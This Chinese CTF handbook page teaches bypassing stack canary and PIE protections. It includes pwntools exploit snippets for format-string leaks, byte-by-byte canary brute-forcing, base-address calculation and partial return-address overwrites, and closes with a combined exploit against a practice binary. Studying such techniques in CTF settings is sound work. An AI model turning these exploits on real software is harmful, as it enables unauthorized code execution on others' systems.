---
title: Canary 与 PIE 绕过
order: 5
icon: mdi:shield-off-outline
category:
  - CTF
  - 手册
  - Pwn
---

Canary 和 PIE 是两种常见的保护机制，本节介绍它们的原理和常见绕过方法。

## Canary 绕过

### Canary 原理

编译器在函数返回前插入一个随机值（Canary）放在栈上，返回前检查它是否被修改：

```
高地址  +------------------+
        | 返回地址          |
        | caller's rbp     |
        | Canary           |  ← 溢出时会先覆盖这里
        | 局部变量          |
低地址  +------------------+
```

Canary 的最低字节总是 `\x00`（防止被 `printf` 等函数打印出来）。

### 绕过方法一：格式化字符串泄露

```python
# 用格式化字符串漏洞泄露栈上的 Canary
payload = b'%15$p'  # 假设 Canary 在第 15 个参数位置
p.sendline(payload)
canary = int(p.recvline(), 16)
print(f"Canary: {hex(canary)}")

# 然后在溢出时填入正确的 Canary
payload = b'A' * offset_to_canary
payload += p64(canary)
payload += p64(0)          # rbp
payload += p64(win_addr)   # 返回地址
```

### 绕过方法二：逐字节爆破（fork 服务）

当程序 `fork()` 后处理请求时，子进程的 Canary 与父进程相同，可以逐字节爆破：

```python
canary = b'\x00'  # Canary 最低字节固定为 \x00

for i in range(7):  # 爆破剩余 7 个字节
    for byte in range(256):
        payload = b'A' * offset + canary + bytes([byte])
        p.send(payload)
        response = p.recv()
        if b'crash' not in response:  # 没崩溃说明这个字节正确
            canary += bytes([byte])
            break
```

### 绕过方法三：覆盖 TLS 中的 Canary

在某些情况下，可以通过堆溢出或其他漏洞修改 TLS（线程本地存储）中存放的 Canary 原始值，使检查通过。

## PIE 绕过

### PIE 原理

PIE（Position Independent Executable）使代码段地址随机化。开启 PIE 后，每次运行程序的基址都不同。

### 绕过方法一：泄露代码段地址

```python
# 通过格式化字符串或其他信息泄露漏洞，泄露栈上保存的返回地址
# 返回地址 = 程序基址 + 固定偏移

# 假设泄露到的地址是 main+0x1a
leak = 0x555555400a1a
elf_base = leak - (elf.symbols['main'] + 0x1a)
win_addr = elf_base + elf.symbols['win']
```

### 绕过方法二：部分覆盖（低字节覆盖）

PIE 只随机化高位字节，低 12 位（3 个十六进制位）是固定的。

```python
# 只覆盖返回地址的最低 2 字节，把它改到同一页内的目标函数
# 成功率 1/16（因为第 12 位也是随机的）
payload = b'A' * offset + b'\x56\x11'  # 覆盖低 2 字节
```

### 绕过方法三：信息泄露

程序输出中可能包含地址信息（错误信息、调试输出等），直接读取即可。

## 综合示例：Canary + PIE + NX

```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')

# 1. 泄露 Canary 和 PIE 基址（通过格式化字符串）
p.sendlineafter(b'name: ', b'%15$p.%17$p')
data = p.recvline().split(b'.')
canary = int(data[0], 16)
elf_leak = int(data[1], 16)
elf.address = elf_leak - 0x1234  # 根据实际偏移调整

log.success(f"Canary: {hex(canary)}")
log.success(f"ELF base: {hex(elf.address)}")

# 2. 构造 payload
payload = b'A' * offset_to_canary
payload += p64(canary)
payload += p64(0)                    # rbp
payload += p64(elf.symbols['win'])   # 返回地址（已修正基址）

p.sendlineafter(b'input: ', payload)
p.interactive()
```

## 练手资源

- CTFHub 保护机制绕过系列
- 攻防世界 Pwn 中级题（带保护的题目）
